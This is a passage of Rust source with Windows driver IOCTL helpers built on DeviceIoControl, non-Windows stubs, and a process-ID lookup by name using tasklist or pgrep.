                std::ptr::null_mut(),
            )
        };

        if success == 0 {
            let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
            Err(format!(
                "DeviceIoControl(0x{:X}, {}) failed: error {}",
                ioctl_code, value, err
            ))
        } else {
            Ok(())
        }
    }

    /// Sends an IOCTL with no input/output buffer to the driver.
    #[cfg(target_os = "windows")]
    fn send_ioctl_empty(ioctl_code: u32) -> Result<(), String> {
        let handle_guard = DRIVER_HANDLE.lock().unwrap();
        let driver = handle_guard
            .as_ref()
            .ok_or_else(|| "Driver handle not open".to_string())?;

        let mut bytes_returned: u32 = 0;

        let success = unsafe {
            winapi::um::ioapiset::DeviceIoControl(
                driver.handle,
                ioctl_code,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                0,
                &mut bytes_returned,
                std::ptr::null_mut(),
            )
        };

        if success == 0 {
            let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
            Err(format!(
                "DeviceIoControl(0x{:X}) failed: error {}",
                ioctl_code, err
            ))
        } else {
            Ok(())
        }
    }

    /// Stub IOCTL helpers for non-Windows targets (compile-only).
    #[cfg(not(target_os = "windows"))]
    #[allow(dead_code)]
    fn send_ioctl_u32(_ioctl_code: u32, _value: u32) -> Result<(), String> {
        Err("IOCTL requires Windows".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    #[allow(dead_code)]
    fn send_ioctl_empty(_ioctl_code: u32) -> Result<(), String> {
        Err("IOCTL requires Windows".to_string())
    }
}

// ==================== Process Helpers ====================

fn find_process_by_name(name: &str) -> Option<u32> {
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = std::process::Command::new("tasklist")
            .args(&["/FI", &format!("IMAGENAME eq {}.exe", name), "/FO", "CSV", "/NH"])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let pid_str = parts[1].trim_matches('"').trim();
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        return Some(pid);
                    }
                }
            }
        }
        None
    }
    #[cfg(not(target_os = "windows"))]
    {
        if let Ok(output) = std::process::Command::new("pgrep")
            .args(&["-x", name])
            .output()
        {
            if let Ok(s) = String::from_utf8(output.stdout) {
                if let Some(line) = s.lines().next() {
                    return line.trim().parse().ok();
                }
            }
        }
        None
    }
}
